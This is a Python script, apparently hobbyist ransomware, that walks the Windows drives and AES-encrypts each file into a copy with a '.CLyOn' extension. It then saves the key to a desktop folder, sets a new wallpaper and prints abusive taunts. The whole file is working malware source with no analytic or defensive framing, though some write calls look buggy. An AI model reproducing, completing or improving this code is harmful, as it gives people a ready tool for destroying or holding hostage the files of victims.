__author__ = 'RetR0'

import os
import win32api
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Util.Padding import unpad
from Crypto.Random import get_random_bytes
import getpass
import ctypes

drives = win32api.GetLogicalDriveStrings()
drives = drives.split('\000')[:-1]

drive_1 = drives[0]

print(drive_1)

path = drive_1

username = getpass.getuser()

user_c_path = drive_1 + "Users\\" + username + "\\"

desktop_path = drive_1 + "Users\\" + username + "\\Desktop\\"

key = get_random_bytes (32)

def encrypt_drive_1_files():

    path = drive_1
    files = []
    for r, d, f in os.walk(path):
        for file in f:
            if '.' in file:
                files.append(os.path.join(r, file))

    for f in files:
        print(f)

        try:
            with open (f, 'rb') as f_file_to_encrypt:
                        text_block = f_file_to_encrypt.read()
        except:
            continue    

        cipher = AES.new(key, AES.MODE_CBC)
        data_result = cipher.encrypt(pad(text_block, AES.block_size))
        try:
            output = f + ".CLyOn" 
            with open(output, 'a') as f_output:
                f_output.write(cipher.iv)
                f_output.write(data_result)
        except:
            print("BRUHH")

encrypt_drive_1_files()

try:
    drive_2 = drives[1]

    def encrypt_drive_2_files():

        path = drive_2
        files = []
        for r, d, f in os.walk(path):
            for file in f:
                if '.' in file:
                    files.append(os.path.join(r, file))

        for f in files:
            print(f)

            try:
                with open (f, 'rb') as f_file_to_encrypt:
                            text_block = f_file_to_encrypt.read()
            except:
                continue    

            cipher = AES.new(key, AES.MODE_CBC)
            data_result = cipher.encrypt(pad(text_block, AES.block_size))
            output = f + ".CLyOn"
            try:
                with open(output, 'a') as f_output:
                    f_output.write(cipher.iv)
                    f_output.write(data_result)
            except:
                print("BRUHH")

    encrypt_drive_2_files()

except:
    print(".")

try:
    drive_3 = drives[2]

    def encrypt_drive_3_files():

        path = drive_3
        files = []
        for r, d, f in os.walk(path):
            for file in f:
                if '.' in file:
                    files.append(os.path.join(r, file))

        for f in files:
            print(f)

            try:
                with open (f, 'rb') as f_file_to_encrypt:
                            text_block = f_file_to_encrypt.read()
            except:
                continue    

            cipher = AES.new(key, AES.MODE_CBC)
            data_result = cipher.encrypt(pad(text_block, AES.block_size))
            try:                        
                output = f + ".CLyOn"
                with open(output, 'wb') as f_output:
                    f_output.write(cipher.iv)
                    f_output.write(data_result)
            except:
                print("BRUHH")
        
            output = f + ".CLyOn"

    encrypt_drive_3_files()

except:
    print(".")

try: 
    output = desktop_path + "\\C-LyOn\\KEY.key"
    with open(output, 'wb') as key_output:
        key_output.write(key)
except:
    print("you pussy")
try:
    image = desktop_path + "\\C-LyOn\\image.jpg"
    SPI_SETDESKWALLPAPER = 20 
    ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, image , 0)
except:
    print("you dick")


print ("YOU BEEN FUCKED !!!!")
